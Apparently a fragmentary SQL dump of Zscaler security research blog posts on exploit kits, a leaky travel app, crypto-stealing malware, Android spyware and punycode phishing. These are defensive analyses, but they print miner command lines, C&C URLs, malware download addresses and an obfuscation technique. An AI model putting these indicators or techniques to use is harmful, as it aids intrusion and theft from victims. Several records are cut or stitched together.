can be seen below.        Figure 2: RIG EK hits geo distribution    RIG EK redirects were mainly seen from malvertising campaigns. The hits were not restricted to any specific geographical location. A recent RIG EK cycle can be seen below.        Figure 3: RIG EK Fiddler capture    The malvertising page redirect can be seen below.        Figure 4: Malvertising redirect    This loads an obfuscated JavaScript, shown below.        Figure 5: Malvertising redirect obfuscated (popunder)    The deobfuscated script is shown below.        Figure 6: Malvertising redirect deobfuscated (popunder)    This redirect loads a fingerprinting page that contains two parts: one part is JavaScript, which collects browser information, and the other part is obfuscated JavaScript, responsible for relaying the information to the RIG EK landing page server. A snippet of the fingerprinting script is shown below.        Figure 7: Browser fingerprinting    A snippet of the obfuscated JavaScript responsible for relaying information is shown below.        Figure 8: Obfuscated JavaScript redirect on the fingerprinting page    The deobfuscated code for this redirect is shown below.        Figure 9: Deobfuscated redirect on fingerprinting page    The landing page contains exploit code for VBScript memory corruption vulnerability CVE-2018-8174 and CVE-2016-0189. There are three scripts on the landing page. The first exploits the recent CVE-2018-8174 vulnerability, the second exploits CVE-2016-0189, and the third is a Flash-based exploit. We can see the CVE-2018-8174 below.        Figure 10: CVE-2018-8174 on the RIG EK landing page    By deobfuscating the code, we can see the VBScript exploit code, which is the same as the PoC for CVE-2018-8174 released on GitHub with minor modifications to weaponize the PoC.        Figure 11: CVE-2018-8174 code comparison    The snippet below shows the part of the landing page exploiting CVE-2016-0189.        Figure 12: CVE-2016-0189 exploit code on RIG EK landing page    The third script targeting the Flash exploit is shown below.        Figure 13: RIG EK landing page Flash exploit call    When we deobfuscate the script, we can observe calls to Flash file download, as shown below.        Figure 13: RIG EK landing page Flash exploit call    The payload seen for this cycle was a trojan. We also saw cryptominers and GandCrab ransomware payloads being downloaded by RIG EK this quarter.    GrandSoft Exploit Kit    GrandSoft is an exploit kit that resurfaced earlier this year, when it was found serving GandCrab ransomware. We have also seen instances of cryptomining payloads being served by the GrandSoft EK in the past quarter.    The GrandSoft EK activity hits are shown below.        Figure 15: GrandSoft EK hits from May 1, 2018, to August 5, 2018    The geographical distribution of the hits can be seen below.        Figure 16: GrandSoft EK heat map    GrandSoft EK redirects were mainly seen from malvertising campaigns. We often see threat actors utilizing the same resources to trigger different attack chains depending on the user session information. One such instance can be seen below, where “freedatingvideo[.]info” was redirecting users to RIG EK or GrandSoft EK gates or a web-based cryptomining site as part of the same malvertising campaign.        Figure 17: GrandSoft EK cycle    GrandSoft EK authors have also added CVE-2018-8174 VBScript memory corruption vulnerability exploit to the landing page. Below is a snippet from the landing page using the CVE-2018-8174 exploit.        Figure 18: CVE-2018-8174 exploit code on the GrandSoft EK landing page    The payload seen with this cycle was GandCrab ransomware.         KaiXin Exploit Kit    The KaiXin EK was active in the last quarter of 2017, and we have not observed many hits for KaiXin EK since then. But recently, we were able to capture an instance of KaiXin EK in the wild. A recent addition to this EK is the use of the CVE-2018-8174 exploit derived from a PoC published on GitHub. The Fiddler capture for the KaiXin exploit kit cycle is shown below.        Figure 19: KaiXin exploit kit Fiddler capture    The landing page consists of two JavaScripts: one loads the calls to the exploit webpage and the other is a redirect to a fingerprinting site, which relays the victim’s system information back to the server. We can see that the attacker is using car brands as variable names on the landing page, consistent with behavior seen in the past.        Figure 20: KaiXin exploit kit landing page    The landing page loads a plugin to detect JavaScript “jquery.js’.” A snippet of this code can be seen below.        Figure 21: KaiXin EK jquery    The LeNnDv.html file downloaded contains the CVE-2018-8174 exploit code derived from the PoC shared on GitHub. A snippet of this code is shown below.        Figure 22: CVE-2018-8174 in KaiXin exploit kit    The page is heavily obfuscated with the call to the payload download shown below.        Figure 23: Obfuscated JavaScript for payload download        Figure 24: First layer JavaScript deobfuscation        Figure 25: Second layer JavaScript deobfuscation    During deobfuscation, we see that the VBScript loaded is similar to the PoC available on GitHub, and KaiXin has adopted it, as did the GrandSoft EK and RIG EK.        Figure 26: CVE-2018-8174 in KaiXin exploit kit    The payload seen for this cycle was a Trojan  (MD5:e28d993fd4ae1fb71d645159f726f570).         Other exploit Kits    Terror EK, which was active at the end of 2017, has shown reduced activity since the start of 2018 and we have not seen any activity for Terror EK this quarter. Magnitude EK, though active, is operating in a very restricted geographic region being served through malvertising campaigns. We have not seen direct hits for Magnitude EK landing pages or gates this quarter, but we continue seeing hits for the malvertisements that were directing users to the Magnitude EK gates.         Conclusion    Exploit kits are effective for infecting victim machines without users’ knowledge. While the trend has been to infect users with ransomware with the expectation that a few users would pay to get access to their data, the trend has shifted to the use of cryptominers and Trojans to steal users’ data and use their system resources to mine cryptocurrency for the attackers. Attackers frequently change their techniques by obfuscating the source code or injecting new exploit code into their EKs, and security researchers analyze and block the new threats by tracking changes in EK behavior.    To help avoid infections from exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Keeping browser plugins and web browsers up to date with latest patches helps to protect against common vulnerabilities targeted by exploit kits. The Zscaler ThreatLabZ research team has confirmed coverage for these exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler Cloud Security Platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/exploit-kits-go-cryptomining-summer-2018-edition');

But, occasionally, that sense of security is tested. Zscaler ThreatLabZ recently came across an app that had a significant flaw, causing it to leak the personal information of iOS users. The details of the app are as follows:    Name: Trip38 Travel Assistant - Free  Platform: iOS  Seller: Trip38 Technologies Private Limited  Size: 25.7 MB  Category: Travel  Compatibility: Requires iOS 8.0 or later. Compatible with iPhone, iPad, and iPod touch.  Languages: English, Simplified Chinese, Spanish  Price: Free           	  		  			  		  		  			Fig 1: Trip38 app on App Store  		  	        Trip38 is a travel assistant app that allows users to plan and track their travel. It stores travel details, including flight times, origination and destination city/country, and accommodation information, such as hotel name, booking dates, etc. We discovered that this app was communicating with its server in an insecure manner.     The app contacted its server via API calls, and all details passed to the server were being sent in plain text, with plain-text responses from the server. Communicating in plain text makes it easy to carry out Man-In-The-Middle (MITM) and other attacks. Login credentials may be intercepted and private information, including the user\'s location and travel plans, may be exposed. This vulnerability is worse when you consider that the app is likely to be used by travelers at hotels, coffee shops, airport terminals, and similar locations that offer free Wi-Fi services, where the chances of eavesdropping are high.     Let\'s look at the app\'s functions and the data being leaked.     As soon as a user installs and uses the app for the first time, it asks for the user\'s location. It was strange to see a second pop-up asking \"Allow\" for location access even when the app is not in use. The screenshot below shows both pop-ups:       	  		  			  		  		  			Fig 2: Location access  		  	           The user may allow or disallow this feature, but in the travel category, it\'s likely that users will allow location access to the app. After this, the user can either log in or register. Being a new user to the app, we tried registering. As shown in screenshot below, it asks for Name, Email, and Password.       	  		  			  		  		  			Fig 3: Sign up process  		  	           As soon as user signs up, all the information—name, email, password, and location details—is sent to the server in plain text as shown below:       	  		  			  		  		  			Fig 4: Plain text username and password  		  	           Upon successful response from server, the app performs an automatic user login request. Again, the details are sent to the server in plain text, except that during signup, the request is sent to userSignup.php with doSignup as the action, and during the login action, the request is sent to doUserLogin to userLogin.php.      	  		  			  		  		  			Fig 5: Username and password leakage during auto-login  		  	           After auto-logging in the user, the app displays the following screen, where it asks to either add a trip or track a flight.       	  		  			  		  		  			Fig 6: First screen after signup/login  		  	           If a user is already registered, the app requests a trip list and, again, the trip request and response are in plain text. In the below screenshot, the trip list is empty because we did not add a past trip. For registered users, the server would respond with a complete list of previous and upcoming trips.       	  		  			  		  		  			Fig 7: Fetching trip list in plain text  		  	          We found that Trip38 is also available on Android, and that version has the same flaws as the iOS version. The requests and responses shown above were the same on Android with only one difference. In the case of iOS, requests contained flag_ios valued as 1; for Android requests, flag_android was set to 1. The screenshot below shows the Google Play page.      	  		  			  		  		  			Fig 8: Trip38 app on Google Play   		  	           According to OWASP Mobile Top 10, we can mark the Trip38 vulnerability as M3-Insecure Communication and M4-Insecure Authentication.     Conclusion:     This is not first time ThreatLabZ has come across an app with flaws like those in Trip38. We blogged about a similar case where an iOS-based SMS app was leaking data. Due to the omnipresence nature of mobile devices and the millions of apps available for them, it has become critical to prevent data leakage at every step. App developers have a responsibility to use standard code security practices, and encryption is essential for keeping users\' data intact and safe from prying eyes.      Note: We contacted the developer of Trip38 about this issue and, as of this writing, we have not heard from them. We have also notified Google and Apple.', 'Mobile', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-trip38');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (26, 'Cryptominers and stealers – malware edition', 'Atinderpal Singh,', 'July 12, 2018', 'It all started in 2008 with a paper on the first decentralized digital currency, Bitcoin, created by an unknown person or persons referred to as Satoshi Nakamoto. Bitcoin is a peer-to-peer currency based on cryptography that works on distributed ledger technology known as blockchain. In 2009, the first open-source software for Bitcoin was released. The main advantage of Bitcoin is its decentralized nature; however, this also makes it impossible to control or censor by any single authority, making Bitcoin attractive to cybercriminals.    Over time, more than 4,000 similar cryptocurrencies, also known as altcoins, have emerged and, as a result, the use of malware that targets bitcoins or altcoins for financial gain has been on the rise. Two cryptocurrencies that have become popular among cybercriminals due to their privacy features and untraceable nature are Zcash and Monero.    In this blog, ThreatLabZ provides an insight of various cryptominers and stealer malware variants that are taking advantage of rising cryptocurrency prices and popularity.         Fig. 1: A bitcoin price chart courtesy coinmarketcap.com         Types of crypto-malware    Cryptocurrency miners and stealers have been around for a few years, but have grown in number with the surge in cryptocurrency value. Cybercriminals have taken notice of the increasing worth and have begun adding support for cryptomining as well as stealing capabilities to existing malware families.    ThreatLabZ researchers have categorized malware payloads related to cryptocurrency into the following three categories:      	Cryptominers  	Wallet stealers  	Clipboard hijackers      We’ve also seen numerous instances of existing malware payload that has been modified to target cryptocurrency.        Fig. 2: Types of crypto-malware and how they work         Cryptominers    Cryptominer malware steals CPU cycles from victims’ systems to mine and generate digital currency, such as bitcoins, without users’ knowledge or consent. Cryptomining malware is a direct source of income for cybercriminals, unlike information-stealing malware, which involves the cybercriminal stealing the information and then the added step of having to sell or use the stolen information for indirect financial gain.    It didn’t take much time for cybercriminals to realize that pooled mining is ideal for botnets. While a single system capable of calculating approximately 100 hashes per second is not useful for mining, a botnet of 100,000 similar hosts can produce 10,000,000 hashes per second. Mining on that scale can result, for example, in roughly 69 Monero (XMR) per day, or more than $8,500 USD, based on a hypothetical Monero price of $125.00 USD.    Authors of most crypto-malware, new or old, download original or slightly modified versions of legitimate and open source-mining software rather than writing their own mining malware. In the beginning of our research, we only observed bitcoin miners, but now Monero tops the list of cryptocurrencies mined by malware. We have seen XMrig, CCMiner, XMR-Stak, and others used for Monero mining activities.    Cryptominers have been targeting all types of operating systems, such as Windows, Linux, OSX, and even Android and IoT devices, despite their low processing power. Cybercriminals have also targeted servers by exploiting various vulnerabilities to install cryptominers.        Fig. 3: Mining stats of one the cryptominer botnets that is still active.    Cryptomining trends have been growing dramatically since cryptocurrency prices hit an all time high in late 2017. In fact, according to ThreatLabZ analysis, cryptomining has outgrown ransomware to become one of the top threats in 2018.         Wallet stealers    Cryptocurrencies such as bitcoins are not stored in wallets as some people might think. Bitcoins are stored in blockchain which is distributed via a public ledger. Cryptocurrencies work on the concept of public key cryptography, where a public key is the wallet address used to receive money, while a private key is kept secret in wallet files and is required to spend money. So, in simple terms, wallets only store credentials to access or spend money stored in blockchain and owned by the user.    Some malicious actors prefer to steal cryptocurrencies already owned by a victim as opposed to mining new coins on a victim’s system; it can take a long time to mine a fair amount of value, depending on the system’s speed.    Wallet stealers have been around for almost as long as cryptominers. In fact, the first bitcoin wallet stealer was documented just three months after the first cryptominer. Over time, some very simple malware emerged whose only function was to steal wallet.dat files, and complex botnets stealing wallet.dat files began to emerge. Some generic and popular infostealer malware variants, like Pony and Azorult, also have the capability to steal cryptocurrency wallets and passwords amongst their long lists of tools.         Clipboard hijackers    Cybercriminals always come up with innovative ways to profit. Clipboard hijacking for replacing crypto-addresses is one of their innovative and subtle methods. Cryptocurrency wallet addresses are cryptographically generated, random-looking sequences of alphanumeric characters. They are not easy to remember, and that works to the advantage of bad actors.  Almost all cryptocurrency owners copy and paste their wallet address for making transactions; if an address is changed dynamically by malware, there is a good chance the victim won’t notice and will perform a transaction that profits the attacker’s account. This technique seems basic, but it’s effective in the case of cryptocurrencies.    In April 2014, a Reddit user posted about the first clipboard hijacker malware, which was a Chrome extension posing as the Dogecoin ticker extension. As a result of that hijacker, the user lost one bitcoin, which would have been worth in excess of $18,000 USD at peak values. Over the years, many clipboard hijacker variants have emerged. Some just replace a bitcoin address with one hardcoded address, while others can replace a bitcoin address with a similar-looking address from as many as 10,000 embedded addresses. Still others ask for a similar address from C&C to further conceal their operation. Some target only one currency, while others target more than 13 currencies.    As with miners and wallet stealers, there is some standalone clipboard hijacker malware in the news, such as ComboJack and CryptoShuffler, and there is multipurpose malware also capable of clipboard hijacking, such as Evrial and NjRAT Lime, which we recently blogged about. A variant of Phorpiex, an old and popular worm, was spotted with clipboard hijacking capability instead of the spamming functionality for which it is known. Technical details given below.         Malware that uses existing functionality to target cryptocurrency    There have also been some malware variants that did not try to add new functionality, but used existing features, such as keylogging, web injects, and overlay attacks to steal cryptocurrencies. Below are few examples:    Dridex:    Around September 2016, banking malware Dridex was seen targeting cryptocurrency-related software, searching filesystem paths and lists of processes to inject keyloggers. This functionality already existed in Dridex and was configured to target cryptocurrency-related tools along with its traditional targets.    TrickBot:    In August 2017, TrickBot, a traditional banking malware variant (with version 1000114 and group tag tt0002) started targeting coinbase.com, a cryptocurrency exchange that deals with Litecoin, Bitcoin, Ethereum, and other digital assets, using a standard WebInject format. Six months later, in February 2018, another TrickBot variant (with version 1000043 and group tag kas2) again targeted crypto-exchanges with dynamic WebInjects for coin purchasing pages.    Android bots (Exobot/Marcher, BankBot):    These are Android malware variants with the ability to detect the top open window of applications and phish credentials for that app by showing a static or dynamically fetched overlay to the user. Initially developed for targeting banking apps, these are also used to steal cryptocurrencies.         Recent malware family variants showing interest in cryptocurrencies    Phorpiex         Phorpiex, also known as Trik (SDBot fork), is a decade-old botnet known for its worming and spamming capabilities. It used to spread via Skype, but for some time it has been spread using email spam and removable drives.        Fig. 4: Phorpiex spreading through removable drives    It began showing interest in coinminers some time back and has been downloading various coinminers along with other malware on systems infected with Phorpiex. It also downloaded a Monero miner payload with following configuration.    “url\": \"monerohash[.]com:3333\",    \"user\": \"4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQr2cM6dRYBvTiv1U3V\",    \"pass\": \"x\",        Image: Monero mining campaign payout    The Monero mining campaign run by Phorpiex operators is still going on and has so far earned approximately $6,797.52 USD.    Recently, we came across Phorpiex v6.0, which did not contain spamming functionality, but contained clipboard hijacking code for targeting multiple cryptocurrencies.

Fig. 7: Victim’s comments on etherscan.io         EngineBox and Xpctra    Some time back, we came across two malware strains targeting Brazilian users. We named them “EngineBox” and “Xpctra” based on class names. The malware contains code from multiple open-source projects, which they use to carry out the malicious activity. They also contain multiple references to characters or objects in Lord of the Rings. The following are open-source projects used by loader and final payload.    The main components of these strains are:      	Remote-access Trojan (RAT)  	Financial data stealing module  	Bot (IRC or TCP)  	AntiAV  	Spamming           Functionality comparison of EngineBox and Xpctra:      	  		  			  			Module  			  			  			EngineBox  			  			  			Xpctra  			  		  		  			  			Persistence  			  			  			Yes  			  			  			Yes  			  		  		  			  			Steal banking data  			  			  			Yes  			  			  			Yes  			  		  		  			  			Steal bitcoin data  			  			  			No  			  			  			Yes  			  		  		  			  			Replace bitcoin address  			  			  			Yes  			  			  			No  			  		  		  			  			Steal email credentials  			  			  			No  			  			  			Yes  			  		  		  			  			RAT  			  			  			Yes  			  			  			Yes  			  		  		  			  			Bot  			  			  			Yes (IRC)  			  			  			Yes (TCP)  			  		  		  			  			Send spam  			  			  			No  			  			  			Yes  			  		  		  			  			Block security software  			  			  			No  			  			  			Yes (12 process names)  			  		  		  			  			Block security websites  			  			  			Yes (3 websites)  			  			  			Yes ( 16 websites)  			  		  	           Complete technical details are beyond the scope of this blog. We will focus only on EngineBox and Xpctra’s cryptocurrency-related activity.    Along with targeting multiple banking sites for traffic interception using Fiddler, the malware targets some websites for keywords related to a bitcoin wallet, address, etc. If a user is submitting any form with a bitcoin address, the malware captures and validates the bitcoin address, and sends it to its C&C server. If some known bitcoin-related website is detected, then it will replace the bitcoin-receiving address with the attacker’s bitcoin address. For example,  “wallet=”, “address=” and \"retirada/form_bitcoin\" are few of the strings monitored by this malware in HTTP requests.        Fig. 8: Code to check and replace bitcoin address in HTTP request    It also steals credentials for digital currency wallet like mercadobitcoin.com, Neteller, Blockchain.info, and PerfectMoney.    \"https://www.mercadobitcoin.com.br/conta/login/\",    \"https://blockchain.info/wallet\",    \"https://member.neteller.com/public/authenticate\",    \"https://perfectmoney.is/user/userlogin.asp\"         Bitcoin address monitor    EngineBox use a clipboard change event handler, which checks whether data copied to a clipboard is a bitcoin address. If a bitcoin address is found on a clipboard, the malware replaces that address with the attacker’s bitcoin address in the hope that the victim will unknowingly transfer bitcoins to the attacker’s address.    The malware sends messages to its C&C server if any bitcoin address is found, and it starts another thread that polls the server every six minutes for bitcoin addresses at “http://log.lapiscolorido.]com/aragorn/admin/bit.php?ACAO=PUSH.”        The “received Bitcoin” address is 12BfckGRRquTvwEJtULhpP2TN1GPez4ntK. The last transaction of this bitcoin address was on 2018-06-25. The attacker is constantly moving money out of this address as soon as it is received. Transactions on this bitcoin address are shown in the screen below:        Fig. 9: Balance of bitcoin address used in malware         Kasidet    Kasidet is multipurpose malware also known as Neutrino, a bot that was first observed being advertised on a hacking forum in December 2013. It was seen downloading coinminers on infected systems starting late 2017. Coinminer details are as follows:    Monero miner:    Parameter:-o stratum+tcp://xmr.pool.minergate.com:45560 -u alexandrjakov@mail.ru -p x    FCN (Fantomcoin) miner:    Parameter: -o stratum+tcp://fcn-xmr.pool.minergate.com:45590 -u alexandrjakov@mail.ru -p x         Timeline on bitcoin price vs. malware family variants        Fig. 10: Timeline of bitcoin price and malware family variants         Conclusion    As more people are getting familiar with and starting to use or invest in cryptocurrencies, the awareness and pervasiveness of cryptocurrencies in everyday life will continue to rise. In spite of their initial resistance to cryptocurrencies, more and more governments are realizing the potential of cryptocurrencies and the underlying blockchain technology in the digital era. They are realizing that they can’t just ban their use—the new era of digital currencies has already begun. As a result, we will see an increase in crypto-malware. The Zscaler ThreatLabZ research team will continue to monitor and analyze these threats with a goal to provide protection against them.         IOC:    Kasidet    Monero Miner MD5: 806779989C6EA355A1ABF4F6C7CB646C    Monero GPU Miner: 88eddf09f8abcd8881737b5b58954099    FCN Miner MD5: 3a18ecb034a227ed0b09a877ebb7cfaa    Phorpiex  MD5: deea904eb9073a36f5cc649559853015, 7f1ddc3894891398f861662d39b6066b  URL : www.eraspire[.]com/wp-content/t7070.exe  MoneorMiner MD5: 3dfa222fed3567b6189762e951d76377    URL:  92.63.197[.]106/mm.exe  C&C:  112.126.94[.]107:5050  123.56.228[.]49:5050  220.181.87[.]80:5050    EngineBox & Xpctra  MD5:   5b0639aab22ed1fdb4913805662078fe  3d9f0fdccc05167d76b8af21cd5985b3  0723683a105cd506e21c9a1d08d06226  661cc13f6a0ca4b14585f772d19dc718  364825dc47eb1688ca325b84dc7d0656    URL:   185.141.165[.]210/gandalf/files/W7.txt  65.181.113[.]87/sshd/aw7.tiff  65.181.113[.]87/sshd/W7.zip  65.181.113[.]87/sshd/dll.dll  65.181.113[.]87/sshd/dll.dll.exe    C&C:  babalu.workscx[.]com  irc.lapiscolorido[.]com  ssh.lapiscolorido[.]com  log.lapiscolorido[.]com  irc.donetuasd[.]com   ssh.donetuasd[.]com   log.donetuasd[.]com   coca.cheddarmcmelt[.]top  fritas.cheddarmcmelt[.]top  ssl.suzukiburgman[.]top  35.166.186[.]98:4782  petr4[.]in/lol/index.php  petr4[.]in/avs/logs/index.php', 'Malware', 'https://www.zscaler.com/blogs/research/cryptominers-and-stealers-malware-edition');

It includes a lot of junk code to throw off security researchers attempting to analyze it.         Fig. 3: Embedded obfuscated macro triggering with AutoOpen      The code links the values stored in the variable and then runs the whole command with wscript.exe.                Fig. 4: PowerShell command being de-obfuscated and executed    In the above snapshot, the code is executing Wscript to download a payload using the PowerShell script. The parameters are stored in “OUzoicLZQ.” The PowerShell script is highly obfuscated making it harder to analyze.     Obfuscation script:         Fig. 5: Obfuscated PowerShell command    In the script, we can see it is using: (GV \'*Mdr*\').nAmE[3,11,2]-jOIN\'\'). This is basically for “iex,” which stands for invoke expression. The Invoke-Expression cmdlet (\"command-let\") evaluates or runs a specified string as a command and returns the results of the expression or command. Using the for loop, it is taking characters from an array one by one as a string and XORing with “1d,” and, finally, making the full string the full command string using the JOIN method.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (28, 'RuMMS malware is back…with enhancements', 'Shivang Desai', 'June 05, 2018', 'Recently, the Zscaler ThreatLabZ team came across a nasty piece of malware hosted on a fake MMS website called mmsprivate[.]site. The site lures victims with what seem to be private photos, inviting them to take a closer look. Upon accepting the offer, victims fall prey to a malicious Android Package (APK) that downloads onto their phones. The malware disguises itself as Сooбщениe, which translated to english means Messages, and performs its malicious functionality by exploiting Android AccessibilityService, which assists those with disabilities in using Android devices and apps. It then hides itself in order to spy on its victims.    The variant we are analyzing shows some similar traits, with a few modifications, to malware named RuMMS, which was initially reported by FireEye researchers back in 2016. This new version includes various enhancements, so we have dubbed it RuMMS v2.0.      App Details     App name:  Сooбщениe  Hash: c1f80e88a0470711cac720a66747665e  Package Name: ru.row.glass         Detailed Description     Download and installation     The malware is spreading through the site url:mmsprivate[.]site/feel/, and was most likely shared via SMS or email. As soon as the link is clicked, the spyware lures the victim to click a button that leads to the dropping of the malicious APK. The content hosted on the URL is in Russian. You can view the translation in the screenshot below:            	  		  			  		  		  			Fig 1: Initial URL leading to the APK download  		  	           The APK is from an unknown source and, since Android systems do not allow direct-install, leads the victim via simple clicks to enabling the \"Unknown Sources\" option to install the malicious app. Each step is shown below starting from left to right.            	  		  			  		  		  			Fig 2: Install from Unknown Sources  		  	           Enabling AccessibilityService  Once installation is complete, the app masks itself as a messaging app (see the icon below). Upon first use, the app redirects the victim to enable Android AccessibilityService. Once enabled, the app disappears from the home screen.                 	  		  			  		  		  			Fig 3: Enabling AccessibilityService  		  	           If the victim does not enable AccessibilityService, the spyware will continuously appear on the screen (see the second screen in the above snapshot) to encourage the victim to enable the service.    Once AccessibilityService is enabled, the spyware goes into action to make the SMS app the default messaging app. It does this by using the functionality of AccessibilityService to automatically choose “Yes” when asked to confirm the app as the default messaging choice, as shown in the below screenshot.  Users will not be able to see this message box because the choice is made for them.            	  		  			  		  		  			Fig 4: Accessibility Service in action  		  	           Communication    Our investigation showed that once the initial setup is done, the malware starts sending details to a command-and-control (C&C) server. The C&C details were hardcoded. Requests and responses from the C&C were encoded using Base64. The screenshot below shows the decode values being sent and received:           	  		  			  		  		  			Fig 5: First request  		  	           The above screenshot shows details of a victim\'s device being sent to a C&C. The C&C replied with command \"40\" and the names of apps. We noticed that command \"40\" was used for disabling the apps.            	  		  			  		  		  			Fig 6: Initial response  		  	           In this instance, the list of apps to be disabled contained well-known antivirus (AV) apps, including:       	Trend Micro   	Dr. Web  	AhnLab  	Avira  	Sophos  	McAfee  	F-Secure      The malware makes sure that all of these AVs, if present, remain inoperable. As soon as a victim tries to open one of these apps, the malware abruptly closes it. It behaved similarly with an app from a well-known Russian bank, Sber Bank. The malware did not allow any Sber Bank apps to open.     SMS: Sending and stealing    The spyware waits for commands from the C&C server and accordingly exhibits its functionality. As in the case below, we found that command number \"11\" was used for sending SMS messages to any desired number with the body of the SMS instructed by C&C           	  		  			  		  		  			Fig 7: Response containing SMS command  		  	           Upon further analysis, we also found the spyware to be stealing SMS messages from the victim\'s device. This functionality could also be used to steal bank-related one-time-password codes and other relevant information. The screenshot below shows this functionality in action:      	  		  			  		  		  			Fig 8: Stealing SMS messages  		  	           Stealing Contacts    The malware is also able to steal contacts from the victim\'s device. We believe this functionality is used to further spread the malware with a well-known technique called SMS-Phishing (or SMiShing).        	  		  			  		  		  			Fig 9: The app stealing contacts  		  	           Calling     The malware also has calling functionality. In the example below, the number to be called was sent from the C&C server in the encoded manner seen here.       	  		  			  		  		  			Fig 10: Calling functionality  		  	           One of the more interesting things we noticed was the way the malware was being distributed. Every time we visited the link, we were presented with a new malicious app exhibiting the same behavior explained above but with different app name, different package name, and even signed with a different Android certificate. We also found that apps had different C&C servers with the pattern http://<domain-name>.com/<random-chars>/index.php. We noticed the below mentioned domain names in association with the C&C servers:            	  		  			Sr #  			Domain Name  			# of apps contacted  		  		  			1  			sisirplus[.]com  			172  		  		  			2  			vietusprotus[.]com   			50  		  		  			3  			glowbobget[.]com  			45  		  		  			4  			hellowopung[.]com  			102  		  		  			5  			quostpeopls[.]com  			24  		  		  			6  			bannerincbest[.]com  			102  		  		  			7  			campuphome[.]com  			9  		  		  			8  			wewelowertick[.]com  			3  		  		  			9  			bigslogous[.]com  			25  		  		  			10  			zavannerweb[.]com  			55  		  	           Conclusion    A new and improved RuMMS is back in full force as RuMMS v2.0 with enhancements and updated features. In the last 10 days of May 2018, the Zscaler ThreatlabZ team uncovered 580+ similar apps making the rounds in the wild. It is always advisable to stay clear of unknown links. Do not trust any suspicious-looking URLs received either in SMS messages or emails, and only download apps from official app stores.     Zscaler customers are protected from such types of attacks at multiple security levels.    Below is the sha256 hash list of recent samples found in last week.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (29, 'SMiShing with Punycode', 'Rohit Hegde', 'May 31, 2018', 'Cybercriminals keep coming up with new ways to steal and profit from personal user data. Because mobile devices are so prevalent, and so capable, they are becoming the targets of a variety of cyberattacks that were previously limited to computers.    One such attack technique is SMS phishing—SMiShing—in which attacks are delivered via text messages. With SMiShing, mobile users receive links to phishing websites through SMS or chat applications, with text messages luring users to click on links and enter their personal information.    Zscaler ThreatlabZ is seeing more of these SMiShing attacks use “Punycode” to make phishing URLs look like legitimate website URLs. This technique is called a homograph attack. The attacker tries to deceive users by replacing one or more characters in the URL with similar-looking characters from another character script.     The following displays hits that we have seen over last three months for phishing activity on mobile devices targeted with Punycode URLs.        Figure 1: Hits seen for SMiShing activity targeting mobile devices with Punycode URLs from March 1 to May 28, 2018.    Let’s look at a recent example that shows a WhatsApp message pretending to be a link to a Jet Airways offer of free air tickets. The link is designed to look like the actual jetairways.com website, but it is using a homograph attack, in which look-alike characters are used to trick the victims.        Figure 2: WhatsApp message on a group pretending to be a link for free tickets.    If you look closely at the character “i” in the URL domain label, you can see that it is a homograph from the Latin character set. More precisely, it is a Unicode Character “Latin small letter dotless I” (U+0131) that replaces the letter “i” in “airways.”        Figure 3: Decoding the homograph domain label.    If the user clicks this link on an iPhone, it opens the Safari web browser and tries to load the phishing website. Notice that the URL looks like jetairways.com; it is difficult to detect that it is not the true site.        Figure 4: Safari Browser on iPhone showing URL in original IDN (Internationalized Domain Name) format.    Not all browsers treat IDN URLs equally, in the image below we see that Google Chrome on an Android phone shows the user the URL in Punycode format.        Figure 5: Google Chrome browser on an Andorid phone showing the URL in Punycode instead of IDN format.    The Web browsers decide whether to display the IDN or Punycode format based on conditions like the presence of certain characters which can spoof the separators like \".\" or \"/\", determining whether all characters come from same language, if characters belong to allowable combinations or by checking if the domain belongs to whitelisted TLDs. The algorithm for this is detailed here. Google Chrome has also adopted a similar set of rules as followed by Mozilla Firefox as detailed here. Browsers can make these decisions based on restriction levels as classified here.    The different behavior to IDN domain labels by common web browsers is seen below.        Figure 6: Different behavior seen for IDN domains on common browsers.     Coming back to our current example, if we check the domain history for this domain on Domaintools it shows that the domain was newly registered within the last two weeks.        Figure 7: Domain registration information.    The full cycle of this phishing attack can be seen in the screenshot below,        Figure 8: Phishing cycle showing a screenshot of phishing webpage.     We can see that after being served the phishing page, the victim is redirected to another domain, newuewfarben[.]com, which can be used to serve malware. At the time of testing, this URL was inactive.    Conclusion:    SMiShing has been on a rise in year 2018 and the addition of homograph technique will continue to make it more effective against unsuspecting mobile users. Web browsers have implemented protections against homograph attacks, but because of the legitimate use of Punycode characters, it becomes very difficult for the developers to implement a foolproof fix. Attackers leverage this to work around the rules and create homographs which are displayed as IDNs despite being malicious in nature.     Zscaler ThreatLabZ is actively monitoring such attacks, to ensure that Zscaler customers are protected.    How can users protect themselves?    Users should exercise caution before clicking on any links shared via SMS or IM application, even when they are from trusted contacts. The IDN format display is controlled by the browsers design and end users have limited control over how the URL is being displayed. The primary and most effective option would be to make use of password managers which check the URLs before entering the passwords into the website, this reduces the chances of users entering credentials to a homograph URL phishing website. The secondary check would be to carefully observe the URLs to spot any obvious character switches.', 'Phishing', 'https://www.zscaler.com/blogs/research/smishing-punycode');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (30, 'Fake Fortnite Apps Scamming and Spying on Android Gamers', 'Viral Gandhi', 'May 17, 2018', 'Fortnite is a co-op sandbox survival game developed by Epic Games and People Can Fly and published by Epic Games. The game was released for Microsoft Windows, macOS, PlayStation 4, and Xbox One on July 25, 2017.    Fortnite now has 45 million players and more than three million concurrent users, which makes it one of the most popular games on the market right now.    Recently, Epic games announced that it would extend its support to mobile platforms and it launched the game for iOS. A version for the Android mobile platform has not been announced, leaving Android users—eager to play this game on their devices—searching for it. Such situations involving popular games always seem to attract malware authors looking to spread their payloads disguised as fake games.    In the past, the ThreatLabZ research team has seen fake Super Mario and Pokemon GO apps in the wild during the release of the legitimate versions. We observed this trend with Fortnite as well, in which multiple instances of Android malware were posing as the Fortnite game. The malware included spyware, a coin miner, and some unwanted apps disguised as the game.    Fake Fortnite game - Spyware    In one instance, we observed Android spyware disguised as the Fortnite game. Upon installation, an icon appears with the Fortnite 